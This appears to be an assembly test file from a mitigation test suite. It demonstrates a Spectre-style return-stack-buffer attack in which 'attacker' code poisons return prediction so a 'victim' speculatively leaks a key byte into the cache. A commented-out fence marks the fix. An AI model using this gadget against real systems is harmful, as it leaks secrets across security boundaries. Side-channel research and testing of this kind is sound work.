.file "xom_tests/spectre_victim.s"

.text
.extern _cache_encode


.align 4096
.globl perform_encryption
perform_encryption:
    // The key is loaded into %rsi as an immediate value
    // This key is overwritten by the victim before use
    mov $0xdeadbeefdeadbeef, %rsi

    // The encryption is just a XOR for brevity
    xor %rsi, %rdi
    mov %rdi, %rax

    // sched_yield to simulate interrupt or other context switch
    mov $0x18, %rax
    syscall

    // Uncomment the next two lines to fix the problem
    // mov (%rsp), %rdi
    // mfence

    // Key is still in %rsi
    // If the victim resumes operation here right after the attacker yields to the kernel,
    // the last RSB entry is from the attacker. In this scenario, the victim speculatively
    // returns to the attacker's return address, where the key is encoded in cache
    ret

.globl victim
victim:
    call perform_encryption
    // Purge the key from the register state
    xor %rsi, %rsi
    mfence
    ret

.align 1024
.globl attacker
attacker:
    mov %rdi, %rdx
    call perform_encryption

    // The victim may speculatively return to this point
    // Encode one key-byte into cache to be retrieved by attacker
    xor %rdi, %rdi
    mov %sil, %dil
    call _cache_encode

    lfence
    ret
